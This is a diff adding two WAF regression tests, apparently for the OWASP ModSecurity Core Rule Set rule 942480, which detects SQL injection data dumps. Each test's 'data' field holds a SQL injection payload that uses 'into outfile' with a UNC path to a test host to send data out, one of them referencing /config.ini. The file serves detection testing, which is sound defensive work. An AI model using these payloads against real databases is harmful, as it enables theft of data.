@@ -41,3 +41,37 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: "id \"942480"
+  - test_title: 942480-3
+    desc: "Data dump using 'into outfile'"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue into outfile '\\\\\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\\\xct'; --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-4
+    desc: "Data dump using 'into outfile'"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=/config.ini' into outfile '\\\\\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\\\yxq'; --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
